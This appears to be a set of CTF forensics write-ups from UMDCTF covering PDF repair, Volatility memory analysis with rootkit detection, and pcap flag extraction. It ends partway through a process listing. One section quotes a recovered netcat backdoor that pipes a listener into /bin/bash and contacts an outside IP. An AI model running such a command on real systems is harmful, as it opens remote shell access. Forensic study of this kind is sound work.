# UMDCTF Forensics Challenges Write-ups

------

## 1. Sensitive [150 Points]

**Not sure what to make of this...**

We are given a ```sensitive``` file with seemingly no extension. Running ```file``` on it also yields no results.

After catting the file, I realised that it is actually a PDF file, but there seems to be spaces in-between each character. After some help from a friend using some Regex magic, we obtained a (still) corrupted PDF file. 

<u>Sidenote:</u> Apparently with the right Regex to remove the correct number of spaces, the steps below are actually unnecessary and the PDF will be uncorrupted. But since I was not RegEx inclined, I decided to do it the hard way and fix the PDF through a hex editor :D

Firstly, let's look at the output from qpdf:

```bash
qpdf --check sensitive2.pdf
WARNING: sensitive2.pdf: file is damaged
WARNING: sensitive2.pdf (offset 93641): xref not found
WARNING: sensitive2.pdf: Attempting to reconstruct cross-reference table
checking sensitive2.pdf
PDF Version: 1.5
File is not encrypted
File is not linearized
WARNING: sensitive2.pdf (object 7 0, offset 68036): expected endstream
WARNING: sensitive2.pdf (object 7 0, offset 1491): attempting to recover stream length
WARNING: sensitive2.pdf (object 7 0, offset 1491): recovered stream length: 66548
```

Hmm.. looks like the xref table can't even be found, let's fix the offset!

The file uses **xref streams** instead of the traditional xref tables at the end of the PDF file, so we have to find the 1st xref stream object which will then link to the other xref stream objects in the PDF.

```bash
3 0 obj #Offset 328
<< /Type /XRef /Length 68 /Filter /FlateDecode /DecodeParms << /Columns 5 /Predictor 12 >> /W [ 1 3 1 ] /Index [ 2 19 ] /Info 15 0 R /Root 4 0 R /Size 21 /Prev 93641
```

This is the 1st obj I found. The offset of it is **328** (*in decimal, as PDF always uses decimal*), but the offset that is set is **216**. (*<u>At this point of time, I tried changing the offset of the xref table at the end, but it will only break a lot of other things. Since this challenge is about unwanted spaces being added to a PDF file, we should try to **remove unnecessary spaces** instead of adding them</u>*)

So I proceeded to remove enough spaces to make the offset of the xref **216**, and here's the new check output:

```bash
WARNING: sensitive2.pdf: file is damaged
WARNING: sensitive2.pdf (offset 93641): xref not found
WARNING: sensitive2.pdf: Attempting to reconstruct cross-reference table
checking sensitive2.pdf
PDF Version: 1.5
File is not encrypted
File is not linearized
WARNING: sensitive2.pdf (object 7 0, offset 67924): expected endstream
WARNING: sensitive2.pdf (object 7 0, offset 1379): attempting to recover stream length
WARNING: sensitive2.pdf (object 7 0, offset 1379): recovered stream length: 66548
```

*What!?*

Hmm.. It looks like our "1st xref stream" is referencing **an xref stream before it** ```/Prev 93641```. Looking around, we notice another xref stream near 93641 (```1 0 obj```). This means that we have to **delete some additional spaces** to reduce the offset of ```1 0 obj```

Now, I experimented deleting the spaces in-between the objects, but it always messed up the offset of the other objects in the xref table. 

But if you notice the other warnings in the check above, you will realise that ```object 7 0```'s stream length seems to be wayyy too long. Maybe we can delete some spaces inside the stream (there's a large chunk of it), **105 spaces**

```bash
qpdf --check sensitive2.pdf
checking sensitive2.pdf
PDF Version: 1.5
File is not encrypted
File is not linearized
WARNING: sensitive2.pdf (object 7 0, offset 67822): expected endstream
WARNING: sensitive2.pdf (object 7 0, offset 1277): attempting to recover stream length
WARNING: sensitive2.pdf (object 7 0, offset 1277): recovered stream length: 66548
WARNING: sensitive2.pdf: file is damaged
WARNING: sensitive2.pdf (object 8 0, offset 67839): expected n n obj
WARNING: sensitive2.pdf: Attempting to reconstruct cross-reference table
WARNING: sensitive2.pdf (object 8 0, offset 84032): expected endstream
WARNING: sensitive2.pdf (object 8 0, offset 67997): attempting to recover stream length
WARNING: sensitive2.pdf (object 8 0, offset 67997): recovered stream length: 16032
```

Oops, wrong move. Looks like we have displaced ```object 8 0``` too in the process. But at least it detects the xref table now. 

Mhmm... maybe we can modify object 8 0's stream instead? That turned out to work!

I then had to cut another 3 spaces from object 7 0's stream and tada, we get the PDF to be working!

The PDF is well... *sensitive*. Initially I thought it was broken again. But shifting the PDF around revealed a very faint QR code.

![SharedScreenshot](code.jpg)

After editing the QR code through filters to make it more visible:

![Annotation 2020-04-20 002114](codefixed.jpg)

Putting it into a QR code reader yields the flag:

```bash
UMDCTF-{l0v3-me_s0me_h3x}
```

**<u>Author's Note:</u>** Fixing the PDF file was very confusing and even harder to describe in words. A live demonstration will be much better, do contact me if you are confused.

------

## Jarred-1 [200 Points]

**Jarred was working on a challenge when I took a snapshot of his VM. Can you find the flag he was working on?**

We are give n the memory dump ```lubuntu-Snapshot```, as well as a `module.dwarf` and `System.map`. These make it pretty clear that we are dealing with a linux memory dump.

To create the profile for the dump, we put the `module.dwarf` and `System.map` into a zip file. We then put the zip file into a folder named `profile` and loaded it into volatility using `--plugin=profile`

I then ran a quick linux_bash as part of the basic enumeration process:

```bash
python vol.py --plugin=profile -f UMDJared1.vmem --profile=LinuxUMDProfilex64 linux_bash
Name                 Command Time                   Command
-------------------- ------------------------------ -------
bash                 2019-11-13 03:59:04 UTC+0000   how do I linux?
bash                 2019-11-13 03:59:21 UTC+0000   UMDCTF-{falskdfklashdkjfhaskljfhakljsdhflkjasdhflkashdk}
bash                 2019-11-13 04:00:22 UTC+0000   echo -n "VU1EQ1RGLXtKYXJyZWRfU2gwdWxEX0hhVjNfTDBjazNkX0gxc19DT21wdTdlcn0=" | base64 -d | sha256sum
bash                 2019-11-13 04:01:32 UTC+0000   UMDCTF-{STRINgz_W0n't_Get_Th3_FLVG}
```

Oh wow that was much easier than expected. Flags 1 and 2 are clearly fake flags, so let's decode the base64 encoded flag. This yields the actual flag:

```
UMDCTF-{Jarred_Sh0ulD_HaV3_L0ck3d_H1s_COmpu7er}
```

------

## A Nation State Musical [300 Points]

**Oh no! It looks like a nation state is trying to attack one of UMDs routers! Using a pcap generated from the attack, try to determine which nation state the attack is coming from.**

**Beware, you only have five guesses.**

**The flag will be in the format UMDCTF-{Country}**

**Note: do not attempt to communicate with or contact any of the IP addresses mentioned in the challenge. The challenge can and should be solved statically.**

We are given an `attack.pcap` file

Opening it reveals tons of TCP packets of constant size of 54. Let's try sorting by size to see if there are any interesting packets. This yields 1 interesting packet with size 292:

```bash
rm -f backd00r
mkfifo backd00r
nc -lk 1337 0<backd00r | /bin/bash 1>backd00
echo '<5= :V@5<V=' | nc 37.46.96.0 1337
```

Since we are looking for a country, I first tried the IP address of the source, but this was incorrect

I then tried the IP address inside the netcat command above, which is from Kazakhstan, and bingo!

```
UMDCTF-{Kazakhstan}
```

**<u>Note:</u>** This probably means that the source IP indicated was a VPN/Proxy IP to mask the actual IP address

------

## Nefarious Bits [300 Points?]

**After being exposed to some solar radiation, it looks like some bits have turned bad. It is your job to figure out what they are trying to say.**

**Note: do not attempt to communicate with or contact any of the IP addresses mentioned in the challenge. The challenge can and should be solved statically.**

We are given yet another `attack.pcap` file.

However this time, sorting by size reveals nothing of interest, all of the packets are of the same size.

I then decided to cycle through the packets to see if there is anything of interest.

That's when I realised a specific 2 byte sequence alternating between 2 possibilities (`0x4419` or `0xc419`. This could mean it is a **binary sequence**.



Looking at wireshark, it indicates that it is the **Header Checksum** which consists of 2 bytes. We now need to extract all the header checksums and simply convert them into a binary sequence! This could have been done easily through Tshark.exe, but me being rather lazy to ready documentation, decided to extract all the packets in JSON form instead and write a python script to do everything:

```python
import json

f = open("test.json", "r")
contents = json.loads(f.read())
f.close()

binary = ""

for x in contents:
    checksum = x["_source"]["layers"]["ip"]["ip.checksum"]

    if (checksum == "0x0000c419"):
        binary += "0"
    else:
        binary += "1"

print(binary)

#Output: 01010101010011010100010001000011010101000100011000101101011110110011001101110110011010010110110001011111011000100011000101110100011100110101111101000000011100100011001101011111001101000110110001110111001101000111100101110011010111110011001101110110011010010011000101111101
```

Decoding the binary in asciitools (it accepts binary streams without spaces :o):

```
UMDCTF-{3vil_b1ts_@r3_4lw4ys_3vi1}
```

------

## Jarred-2 [500 Points]

**<u>Warning:</u>** This is one of the most difficult challenges, I was unable to retrieve the attacker's IP address unfortunately.

**Jarred thinks his computer got h4cked? Check out the memory dump to see if he has any proof.**

**NOTE: This flag is NON-standard. The password to the zip file with the flag format is the name of the RK. [Rootkit]**

**Jarred-1 System.map and module.dwarf are needed here***



The first thing we need to do is the find the name of the Rootkit (RK). We can do this with the **Rootkit Detection** tools provided by volatility. After trying quite a few tools, `linux_check_modules` gave the name of the rootkit. This plugin checks for modules which might have malware in them.

```bash
python vol.py --plugin=profile -f UMDJared2.vmem --profile=LinuxUMDProfilex64 linux_check_modules

Module Address       Core Address       Init Address Module Name
------------------ ------------------ ------------------ ------------------------
0xffffffffc0574400 0xffffffffc0571000                0x0 reptile_module
```

Hence, the name of the rootkit is "Reptile". This gives us access to flagformat.txt inside the zip.

```bash
#flagformat.txt

UMDCTF-{0xmodule_addr:uptime_when_loaded:pid_of_evil_process:attacker_ip}

*colon separated items*
*address includes `0x`*
*IP format X.X.X.X*
```

Now, we have to look for 4 things:

- Module Address
- Uptime when the malware was loaded
- PID of the malware process
- Attacker's IP

We already have the module address from `linux_check_modules` above, which is:

```bash
0xffffffffc0574400
```

So, let's try to find the rest!



Looking at pslist, there didn't seem to be anything of interest:

```bash
python vol.py --plugin=profile -f UMDJared2.vmem --profile=LinuxUMDProfilex64 linux_pslist
Offset             Name                 Pid             PPid            Uid             Gid    DTB                Start Time
------------------ -------------------- --------------- --------------- --------------- ------ ------------------ ----------
0xffff9e008b7eae00 systemd              1               0               0               0      0x0000000053ec0000 2020-04-15 02:50:53 UTC+0000
0xffff9e008b7e9700 kthreadd             2               0               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008b7ec500 rcu_gp               3               2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008b7edc00 rcu_par_gp           4               2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008b7e8000 kworker/0:0          5               2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008ac0dc00 kworker/0:0H         6               2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008ac0ae00 mm_percpu_wq         8               2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008ac09700 ksoftirqd/0          9               2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008ac0c500 rcu_sched            10              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008ac10000 migration/0          11              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008ac12e00 idle_inject/0        12              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008ac11700 kworker/0:1          13              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008afa2e00 cpuhp/0              14              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008afa1700 cpuhp/1              15              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008afa4500 idle_inject/1        16              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008afa5c00 migration/1          17              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008afa0000 ksoftirqd/1          18              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008afadc00 kworker/1:0          19              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008afa8000 kworker/1:0H         20              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008afaae00 kdevtmpfs            21              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008afa9700 netns                22              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008a88c500 rcu_tasks_kthre      23              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008a88dc00 kauditd              24              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008afac500 kworker/1:1          25              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008a8d2e00 kworker/1:2          26              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008a88ae00 khungtaskd           28              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008a8d1700 oom_reaper           29              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008a8d4500 writeback            30              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008a889700 kcompactd0           31              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008a8d5c00 ksmd                 32              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008a8d0000 khugepaged           33              2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008a998000 kintegrityd          125             2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008a9bdc00 kblockd              126             2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008a9b9700 blkcg_punt_bio       127             2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008a9bae00 tpm_dev_wq           128             2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008a9b8000 ata_sff              129             2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008a99ae00 md                   130             2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008a99c500 edac-poller          131             2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008a99dc00 devfreq_wq           132             2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008a9bc500 watchdogd            133             2               0               0      ------------------ 2020-04-15 02:50:53 UTC+0000
0xffff9e008a9ddc00 kswapd0              136             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9d9700 kworker/u257:0       137             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9a0000 ecryptfs-kthrea      138             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9dc500 kthrotld             141             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9a4500 irq/24-pciehp        142             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a92ae00 irq/25-pciehp        143             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a92dc00 irq/26-pciehp        144             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a92c500 irq/27-pciehp        145             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a929700 irq/28-pciehp        146             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9dae00 irq/29-pciehp        147             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a944500 irq/30-pciehp        148             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a940000 irq/31-pciehp        149             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a942e00 irq/32-pciehp        150             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a945c00 irq/33-pciehp        151             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a941700 irq/34-pciehp        152             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9c8000 irq/35-pciehp        153             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9cdc00 irq/36-pciehp        154             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9c9700 irq/37-pciehp        155             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9cae00 irq/38-pciehp        156             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9cc500 irq/39-pciehp        157             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9c1700 irq/40-pciehp        158             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9c0000 irq/41-pciehp        159             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9c4500 irq/42-pciehp        160             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9c2e00 irq/43-pciehp        161             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9c5c00 irq/44-pciehp        162             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9b0000 irq/45-pciehp        163             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9b4500 irq/46-pciehp        164             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9b2e00 irq/47-pciehp        165             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9b5c00 irq/48-pciehp        166             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9b1700 irq/49-pciehp        167             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a995c00 irq/50-pciehp        168             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a994500 irq/51-pciehp        169             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a991700 irq/52-pciehp        170             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a990000 irq/53-pciehp        171             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a992e00 irq/54-pciehp        172             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9aae00 irq/55-pciehp        173             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9a8000 acpi_thermal_pm      174             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9a2e00 scsi_eh_0            175             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9a5c00 scsi_tmf_0           176             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9a1700 scsi_eh_1            177             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9d8000 scsi_tmf_1           178             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a999700 ipv6_addrconf        180             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0093da5c00 kstrp                192             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0093da4500 charger_manager      211             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0093e24500 scsi_eh_2            246             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0093d94500 scsi_tmf_2           247             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0093e22e00 mpt_poll_0           248             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0093e20000 scsi_eh_3            249             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0093d59700 scsi_tmf_3           250             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0093e25c00 mpt/0                251             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0093d58000 scsi_eh_4            252             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0093d5c500 scsi_tmf_4           253             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0093d5dc00 scsi_eh_5            254             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0093d5ae00 irq/16-vmwgfx        255             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e008a9ac500 scsi_tmf_5           256             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0093e88000 ttm_swap             257             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0093dd0000 scsi_eh_6            258             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0093e49700 scsi_tmf_6           259             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0093e4ae00 scsi_eh_7            260             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0093da2e00 cryptd               261             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0093e48000 scsi_tmf_7           262             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00927b5c00 scsi_eh_8            265             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00927b0000 scsi_tmf_8           266             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00927b2e00 scsi_eh_9            267             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00927b1700 scsi_tmf_9           269             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0093e4c500 scsi_eh_10           271             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0093e4dc00 scsi_tmf_10          272             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0093da1700 scsi_eh_11           274             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00921cdc00 scsi_tmf_11          276             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00921cae00 scsi_eh_12           278             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00921c9700 scsi_tmf_12          279             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00921cc500 scsi_eh_13           281             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00921fae00 scsi_tmf_13          285             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00921f9700 scsi_eh_14           286             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0092214500 scsi_tmf_14          287             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0092210000 scsi_eh_15           289             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0092224500 scsi_tmf_15          292             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0092225c00 scsi_eh_16           293             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0092220000 scsi_tmf_16          294             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0092222e00 scsi_eh_17           295             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0092221700 scsi_tmf_17          296             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00921fc500 scsi_eh_18           297             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00921c8000 scsi_tmf_18          298             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e009229ae00 scsi_eh_19           299             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0092299700 scsi_tmf_19          300             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00921b0000 scsi_eh_20           301             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00921b5c00 scsi_tmf_20          302             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00921b1700 scsi_eh_21           303             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00921b4500 scsi_tmf_21          304             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00921b2e00 scsi_eh_22           305             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00927b4500 scsi_tmf_22          306             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00922d5c00 scsi_eh_23           307             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00922d0000 scsi_tmf_23          308             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00922d2e00 scsi_eh_24           309             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00922d1700 scsi_tmf_24          310             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e00922d4500 scsi_eh_25           311             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0092330000 scsi_tmf_25          312             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0092332e00 scsi_eh_26           313             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0092331700 scsi_tmf_26          314             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0092334500 scsi_eh_27           315             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0092335c00 scsi_tmf_27          316             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e009236c500 scsi_eh_28           317             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e009236dc00 scsi_tmf_28          318             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0092368000 scsi_eh_29           319             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e009236ae00 scsi_tmf_29          320             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0092369700 scsi_eh_30           321             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e009238dc00 scsi_tmf_30          322             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0092388000 scsi_eh_31           323             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e009238ae00 scsi_tmf_31          324             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0091c10000 kworker/u256:26      347             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0091c12e00 kworker/u256:27      348             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0091c6c500 kworker/u256:28      349             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0091c6dc00 kworker/u256:29      350             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0091c81700 kworker/0:3          371             2               0               0      ------------------ 2020-04-15 02:50:55 UTC+0000
0xffff9e0091c71700 scsi_eh_32           375             2               0               0      ------------------ 2020-04-15 02:50:56 UTC+0000
0xffff9e0091c70000 scsi_tmf_32          376             2               0               0      ------------------ 2020-04-15 02:50:56 UTC+0000
0xffff9e0091c72e00 kworker/1:1H         377             2               0               0      ------------------ 2020-04-15 02:50:56 UTC+0000
0xffff9e0091c74500 kworker/0:1H         382             2               0               0      ------------------ 2020-04-15 02:50:56 UTC+0000
0xffff9e0091c80000 loop0                477             2               0               0      ------------------ 2020-04-15 02:50:56 UTC+0000
0xffff9e0093d95c00 systemd-journal      968             1               0               0      0x00000000492ec000 2020-04-15 02:51:01 UTC+0000
0xffff9e0093d90000 kworker/1:3          973             2               0               0      ------------------ 2020-04-15 02:51:01 UTC+0000
0xffff9e0093d91700 kworker/1:4          974             2               0               0      ------------------ 2020-04-15 02:51:01 UTC+0000
0xffff9e00915b0000 systemd-udevd        980             1               0               0      0x0000000047ee0000 2020-04-15 02:51:01 UTC+0000
0xffff9e0093d92e00 kworker/0:4          983             2               0               0      ------------------ 2020-04-15 02:51:01 UTC+0000
0xffff9e00915b2e00 haveged              1025            1               0               0      0x0000000046fae000 2020-04-15 02:51:02 UTC+0000
0xffff9e00915b1700 systemd-timesyn      1026            1               100             102    0x00000000481d2000 2020-04-15 02:51:02 UTC+0000
0xffff9e0092298000 systemd-resolve      1028            1               102             104    0x0000000048190000 2020-04-15 02:51:02 UTC+0000
0xffff9e009229c500 kworker/0:5          1029            2               0               0      ------------------ 2020-04-15 02:51:02 UTC+0000
0xffff9e0091c8ae00 cron                 1198            1               0               0      0x000000004724e000 2020-04-15 02:51:03 UTC+0000
0xffff9e0091c8c500 systemd-logind       1199            1               0               0      0x000000002ecae000 2020-04-15 02:51:03 UTC+0000
0xffff9e0092211700 dbus-daemon          1201            1               103             106    0x000000004490c000 2020-04-15 02:51:03 UTC+0000
0xffff9e0092215c00 udisksd              1202            1               0               0      0x0000000044b80000 2020-04-15 02:51:03 UTC+0000
0xffff9e0093e8dc00 cupsd                1206            1               0               0      0x0000000045030000 2020-04-15 02:51:03 UTC+0000
0xffff9e0093e89700 acpid                1207            1               0               0      0x0000000045168000 2020-04-15 02:51:03 UTC+0000
0xffff9e0093e8c500 NetworkManager       1208            1               0               0      0x0000000046822000 2020-04-15 02:51:03 UTC+0000
0xffff9e0093dd2e00 ModemManager         1210            1               0               0      0x0000000046aaa000 2020-04-15 02:51:03 UTC+0000
0xffff9e0093dd5c00 rsyslogd             1211            1               104             110    0x0000000046886000 2020-04-15 02:51:03 UTC+0000
0xffff9e0093dd4500 wpa_supplicant       1212            1               0               0      0x00000000468a0000 2020-04-15 02:51:03 UTC+0000
0xffff9e0091c85c00 ofonod               1215            1               0               0      0x0000000045da4000 2020-04-15 02:51:03 UTC+0000 ****
0xffff9e0091c69700 irqbalance           1222            1               0               0      0x000000003c762000 2020-04-15 02:51:03 UTC+0000
0xffff9e008450ae00 accounts-daemon      1223            1               0               0      0x000000004478e000 2020-04-15 02:51:03 UTC+0000
0xffff9e0084509700 avahi-daemon         1225            1               113             120    0x000000003c522000 2020-04-15 02:51:03 UTC+0000
0xffff9e008450dc00 networkd-dispat      1230            1               0               0      0x000000003c4b4000 2020-04-15 02:51:03 UTC+0000
0xffff9e0091c84500 avahi-daemon         1278            1225            113             120    0x00000000430ec000 2020-04-15 02:51:03 UTC+0000
0xffff9e007c58ae00 cups-browsed         1282            1               0               0      0x000000003fe1e000 2020-04-15 02:51:03 UTC+0000
0xffff9e0092212e00 polkitd              1298            1               0               0      0x0000000043000000 2020-04-15 02:51:03 UTC+0000
